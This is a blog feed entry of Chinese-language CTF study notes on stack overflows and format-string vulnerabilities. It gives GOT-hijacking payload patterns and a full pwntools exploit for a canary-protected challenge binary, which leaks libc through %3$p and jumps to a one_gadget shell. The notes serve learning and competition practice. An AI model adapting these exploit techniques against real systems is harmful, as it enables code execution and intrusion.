<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-10-28T09:56:26.042Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>changyangr</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>重新做人之 pwn 栈溢出</title>
    <link href="http://example.com/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://example.com/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/</id>
    <published>2021-10-28T06:27:45.000Z</published>
    <updated>2021-10-28T09:56:26.042Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2> <font color="red"><p> 函数状态主要涉及三个寄存器－－esp，ebp，eip。<br> esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。<br> ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。<br> eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p><p> 这是一个栈：<br> <img src="/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/zhan.jpg"><br> caller: 调用函数<br> callee: 被调用函数<br> 我们通过函数向栈里面写入的数据应是从 argn 开始，一路写进去，最后覆盖 callee 的 return address。<br> 所以一般的 payload= padding + (ebp) + (eip)<br> ebp 的覆盖一般来说可以任意。</p> </font><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="格式化字符串介绍"><a href="#格式化字符串介绍" class="headerlink" title="格式化字符串介绍"></a>格式化字符串介绍</h3> <font color="red"><pre><code>格式化字符串是一个使 printf 类函数 错误的漏洞，虽然利用方法（对我来说）较难，但是利用方式却多样。</code></pre> </font> <font color="Blue">  <p> 格式化字符串 漏洞 ：<br>    %x : 输出一个16进制数，前面没有 0x<br>    %p : 输出一个16进制数，前面带有 0x （一般来说，使用 %p 来泄露地址）<br>    %c : 写入一个字符，用来填充字符 如 %13c，经 printf 识别，就会写入13个字符。 劫持 got 表时，需要用到。<br>    %s : 输出一个字符串。 可以用来泄露地址。<br>    %n : 写入一个数字，且为已写入字符的数量，配合 %c 修改地址。<br>    （除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。）</p> </font> <font face="黑体" color="red" size="5"><p> 32位是通过堆栈传参<br> 64位是通过寄存器+堆栈传参，顺序依次是：rdi、rsi、rdx、rcx、r8、r9（edi、esi、edx、ecx、r8、r9）<br> 注意：<br> 我们向栈里写入的数据是先存放在栈上，后通过 printf 识别，再输出的。所以 本身的 %p 之类被识别的指令，也是会在栈上占据位置。 </p> </font> <font color="green"><p> 32位 格式化字符串漏洞的 got表 劫持：<br> offset = 5<br> payload=p32(got)+’%’+str(system-4)+’c%5$n’ 将got里存放的地址写为system的 地址。</p><p> 也可以这么写：<br> offset = 5<br> payload=p32(got)+p32(got+1)+p32(got+2)+p32(got+3)<br> payload+=’%’+str()+’c%5$hhn’<br> payload+=’%’+str()+’c%6$hhn’<br> payload+=’%’+str()+’c%7$hhn’<br> payload+=’%’+str()+’c%8$hhn’<br> 依照位次而定，每一个覆盖是2位。（因为无论是32位或是64位 汇编，都是小端序，所以需要倒着写）</p> </font> <font color="red"><p> 64位 格式化字符串漏洞的 got表 劫持：</p><p> 64位是通过寄存器+堆栈传参，顺序依次是：rdi、rsi、rdx、rcx、r8、r9（edi、esi、edx、ecx、r8、r9）</p><p> offset=6    一般情况下偏移为 6 或 7</p><p> 由于64位下用户可见的内存地址高位都带有\x00(64位地址共16个16进制数)，而 \x00 是字符串结束符。<br> 所以 应把要改 的 got表地址 放在后面，且不能用%hhn 分段写。<br> 如：<br> payload=’a%’+str(system-1)+’c%8$lln’+p64(got)     加 a 是为了使得数据在栈上对齐。</p> </font><h3 id="例题：mid-canary"><a href="#例题：mid-canary" class="headerlink" title="例题：mid-canary"></a>例题：mid-canary</h3> <font color="red"> libc 为 libc-2.23.11.3 checksec 使用带 canary 的64位 elf 程序。 一个一轮游的 格式化字符串漏洞。 ![ca1.png] 因为只走一轮，且有 canary 所以肯定不能够直接拿到shell。 只有 劫持 stack_chk_fail 函数为 main 函数。 在输入之后，输出之前下断点查看寄存器的值。 ![](ca2.png) 发现 rcx 里的存放着 write_nocancel+7 的值,而 write_nocancel 为调用write 需要调用的函数，且彼此之间的偏移是固定的。 所以我们只需要泄露出 rcx 的值就可以计算出 write_addr ，从而泄露出 libc 的偏移。 而 rcx 为64位 传参的第4位，但是 经过测试 发现 偏移为 3 ，即 %3$p 能泄露出地址。 所以 exp 如下： <table><tr><td bgcolor="yellow"> from pwn import * from LibcSearcher import *<p> def debug():<br>    gdb.attach(io)<br>    pause()<br> context.log_level = ‘debug’<br> io = process(“./ca”)<br> elf=ELF(“ca”)<br> ogg=[0x45226,0x4527a,0xf03a4,0xf1247]<br> check_fail=elf.got[‘__stack_chk_fail’]<br> write_got=elf.got[‘write’]<br> print(hex(write_got))<br> main_addr=0x00400737</p><p> payload=’a%’+str(main_addr-1)+’c%8$lln’<br> payload+=p64(check_fail)<br> payload=payload.ljust(0x118,’a’)</p><p> #payload=’aaab%7$s’+p64(write_got)</p><p> io.recvuntil(“What is your name: “)<br> io.sendline(payload)<br> debug()<br> io.recvuntil(“Hello “)<br> junk1=io.recv(16)<br> print(junk1)</p><p> #io.recvuntil(“aaab”)<br> #canary=u64(io.recv(18).ljust(8,’\x00’))<br> #canary=int(io.recvuntil(‘0x’,drop=True),16)-240  不用泄露 canary。而且 canary被覆盖住了，泄露不出来。</p><p> io.recvuntil(“What is your name: “)<br> exploit=’aaab’+’%3$p’</p><p> exploit=exploit.ljust(0x118,’a’)<br> io.sendline(exploit)<br> io.recvuntil(“Hello “)<br> io.recvuntil(‘ab’)</p><p> junk=int(io.recv(14),16)-0x10</p><p> #junk=u64(io.recv(6).ljust(8,’\x00’))</p><p> libc=LibcSearcher(‘write’,junk)<br> print(hex(junk))</p><p> base=junk-libc.dump(‘write’)<br> ogg_addr=ogg[0]+base</p><p> payload=’a’*0x118+p64(ogg_addr)   </p><p> io.recvuntil(“What is your name: “)<br> io.sendline(payload)<br> io.interactive()</p> </td></tr></table></font><h3 id="ez-ret3"><a href="#ez-ret3" class="headerlink" title="ez_ret3"></a>ez_ret3</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
</feed>
